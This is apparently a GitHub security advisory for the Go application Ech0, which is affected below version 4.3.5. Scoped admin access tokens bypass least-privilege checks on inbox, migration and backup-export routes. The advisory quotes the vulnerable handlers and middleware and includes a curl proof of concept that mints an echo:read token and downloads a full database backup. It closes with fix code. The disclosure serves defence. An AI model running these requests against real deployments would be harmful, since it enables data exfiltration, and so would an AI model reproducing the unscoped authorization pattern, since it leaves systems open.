# [H] Ech0: Scoped admin access tokens can bypass least-privilege controls on privileged endpoints, including backup export

## Summary
Severity: High
Advisory: GHSA-4h9q-p5j4-xvvh
CWE: CWE-285
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-4h9q-p5j4-xvvh
Type: github-advisory

## Affected
- Go: `github.com/lin-snow/ech0` — affected >=0 <4.3.5

## Details
## Summary

Ech0 scoped access tokens do not reliably enforce least privilege: multiple privileged admin routes omit scope checks, and the backup export handler strips token scope metadata entirely, allowing a low-scope admin access token to reach broader admin functionality than intended.

## Impact

An attacker who obtains a deliberately limited access token for an admin account can use that token to access privileged functionality outside its assigned scope. Confirmed impact includes access to `/api/inbox` with a token scoped only for `echo:read` and successful backup export via `/api/backup/export?token=...`, which returns a full ZIP archive. In practice, this turns a narrowly delegated API token into a broader privileged access and data exfiltration primitive.

## Details

The issue is caused by a split authorization model:

- `JWTAuthMiddleware()` authenticates the token and stores scope metadata in the viewer context
- `RequireScopes(...)` enforces least privilege, but only when a route explicitly adds it
- several privileged routes omit `RequireScopes(...)`
- multiple service methods then authorize using only `user.IsAdmin`

`internal/middleware/scope.go` shows that scope enforcement is opt-in:

```go
func RequireScopes(scopes ...string) gin.HandlerFunc {
	return func(ctx *gin.Context) {
		v := viewer.MustFromContext(ctx.Request.Context())
		if v.TokenType() == authModel.TokenTypeSession {
			ctx.Next()
			return
		}
		if v.TokenType() != authModel.TokenTypeAccess { ... }
		if !containsValidAudience(v.Audience()) { ... }
		if !containsAllScopes(v.Scopes(), scopes) { ... }
		ctx.Next()
	}
}
```

Representative privileged routes omit `RequireScopes(...)`, for example `internal/router/inbox.go`:

```go
func setupInboxRoutes(appRouterGroup *AppRouterGroup, h *handler.Bundle) {
	appRouterGroup.AuthRouterGroup.GET("/inbox", h.InboxHandler.GetInboxList())
	appRouterGroup.AuthRouterGroup.GET("/inbox/unread", h.InboxHandler.GetUnreadInbox())
	appRouterGroup.AuthRouterGroup.PUT("/inbox/:id/read", h.InboxHandler.MarkInboxAsRead())
	appRouterGroup.AuthRouterGroup.DELETE("/inbox/:id", h.InboxHandler.DeleteInbox())
	appRouterGroup.AuthRouterGroup.DELETE("/inbox", h.InboxHandler.ClearInbox())
}
```

Other source-confirmed unguarded privileged surfaces include:

- `/api/panel/comments*`
- `/api/addConnect`
- `/api/delConnect/:id`
- `/api/migration/*`
- `/api/backup/export`

Service-layer authorization often checks only admin role. For example, `internal/service/inbox/inbox.go`:

```go
func (inboxService *InboxService) ensureAdmin(ctx context.Context) error {
	userid := viewer.MustFromContext(ctx).UserID()
	user, err := inboxService.commonService.CommonGetUserByUserId(ctx, userid)
	if err != nil {
		return err
	}
	if !user.IsAdmin {
		return errors.New(commonModel.NO_PERMISSION_DENIED)
	}
	return nil
}
```

The backup export path is a stronger variant because it discards token metadata before authorization. `internal/handler/backup/backup.go` reparses a query token and rebuilds a bare viewer from only the user ID:

```go
func (backupHandler *BackupHandler) ExportBackup() gin.HandlerFunc {
	return res.Execute(func(ctx *gin.Context) res.Response {
		token := ctx.Query("token")
		claims, err := jwtUtil.ParseToken(token)
		if err != nil { ... }

		reqCtx := viewer.WithContext(context.Background(), viewer.NewUserViewer(claims.Userid))
		if err := backupHandler.backupService.ExportBackup(ctx, reqCtx); err != nil { ... }
		return res.Response{Msg: commonModel.EXPORT_BACKUP_SUCCESS}
	})
}
```

This drops token type, scopes, audience, and token ID before the backup service runs.

## Proof of concept

### 1. Start the app

```bash
docker run -d \
  --name ech0 \
  -p 6277:6277 \
  -v /opt/ech0/data:/app/data \
  -e JWT_SECRET="Hello Echos" \
  sn0wl1n/ech0:latest
```

### 2. Initialize an owner account

```bash
curl -sS -X POST "http://127.0.0.1:6277/api/init/owner" \
  -H 'Content-Type: application/json' \
  -d '{"username":"owner","password":"ownerpass","email":"owner@example.com"}'
```

### 3. Log in as the owner and mint a low-scope access token

```bash
owner_token=$(
  curl -sS -X POST "http://127.0.0.1:6277/api/login" \
    -H 'Content-Type: application/json' \
    -d '{"username":"owner","password":"ownerpass"}' \
  | sed -n 's/.*"data":"\([^"]*\)".*/\1/p'
)

low_scope_admin_token=$(
  curl -sS -X POST "http://127.0.0.1:6277/api/access-tokens" \
    -H 'Content-Type: application/json' \
    -H "Authorization: Bearer $owner_token" \
    -d '{"name":"echo-read-only","expiry":"8_hours","scopes":["echo:read"],"audience":"cli"}' \
  | sed -n 's/.*"data":"\([^"]*\)".*/\1/p'
)
```

### 4. Use the low-scope token on an unguarded admin route

```bash
curl -sS "http://127.0.0.1:6277/api/inbox" \
  -H "Authorization: Bearer $low_scope_admin_token"
```

Observed response:

```text
{"code":1,"msg":"获取收件箱成功","data":{"total":0,"items":[]}}
```

### 5. Use the same low-scope token on backup export

```bash
curl "http://127.0.0.1:6277/api/backup/export?token=$low_scope_admin_token"
```

Observed response:

<img width="585" height="111" alt="image" src="https://github.com/user-attachments/assets/28dd7037-163b-4d7c-8994-a719220b3a6c" />

Try to unzip we will have log and database file:

```
->% unzip a.zip -d a
Archive:  a.zip
  inflating: a/app.log               
  inflating: a/ech0.db  
```

## Recommended fix

Apply scope enforcement to every privileged route, move backup export behind the authenticated router group, and preserve the existing authenticated viewer context instead of rebuilding identity from raw JWT claims.

Suggested route-level changes:

```go
import (
	"github.com/lin-snow/ech0/internal/handler"
	"github.com/lin-snow/ech0/internal/middleware"
	authModel "github.com/lin-snow/ech0/internal/model/auth"
)

func setupInboxRoutes(appRouterGroup *AppRouterGroup, h *handler.Bundle) {
	appRouterGroup.AuthRouterGroup.GET(
		"/inbox",
		middleware.RequireScopes(authModel.ScopeAdminSettings),
		h.InboxHandler.GetInboxList(),
	)
	// Apply the same pattern to the remaining inbox routes.
}

func setupCommonRoutes(appRouterGroup *AppRouterGroup, h *handler.Bundle) {
	appRouterGroup.AuthRouterGroup.GET(
		"/backup/export",
		middleware.RequireScopes(authModel.ScopeAdminSettings),
		h.BackupHandler.ExportBackup(),
	)
}
```

Suggested handler fix for `internal/handler/backup/backup.go`:

```go
func (backupHandler *BackupHandler) ExportBackup() gin.HandlerFunc {
	return res.Execute(func(ctx *gin.Context) res.Response {
		if err := backupHandler.backupService.ExportBackup(ctx, ctx.Request.Context()); err != nil {
			return res.Response{
				Msg: "",
				Err: err,
			}
		}

		return res.Response{
			Msg: commonModel.EXPORT_BACKUP_SUCCESS,
		}
	})
}
```

The same principle should be applied to other privileged services: do not authorize only on `user.IsAdmin`; also validate scopes carried by access tokens.

## References
- https://github.com/lin-snow/Ech0/security/advisories/GHSA-4h9q-p5j4-xvvh
- https://github.com/lin-snow/Ech0
- https://github.com/lin-snow/Ech0/releases/tag/v4.3.5
